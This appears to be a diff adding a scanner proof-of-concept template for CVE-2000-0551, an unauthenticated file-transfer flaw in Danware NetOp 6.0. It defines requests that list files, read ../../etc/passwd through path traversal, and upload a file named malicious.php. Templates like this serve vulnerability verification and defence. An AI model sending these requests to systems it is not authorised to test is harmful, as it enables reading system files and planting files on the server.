@@ -1,0 +1,61 @@
+[info]
+author = "ave"
+description = "验证 Danware NetOp 6.0 文件传输服务是否存在未授权访问漏洞，攻击者无需身份认证即可访问服务器文件传输功能，实现任意文件读取操作。"
+id = "POC-AVE-2000-1200"
+name = "Danware NetOp 6.0 文件传输服务未授权访问 PoC"
+severity = "critical"
+tags = ["ave-2000-1200"]
+vuln_id = [
+    "CVE-2000-0551",
+    "AVE-2000-1200",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/filetransfer/listfiles"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/filetransfer/download"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[poc.requests.query]
+filename = "../../etc/passwd"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/filetransfer/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"file": "malicious.php"}'
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
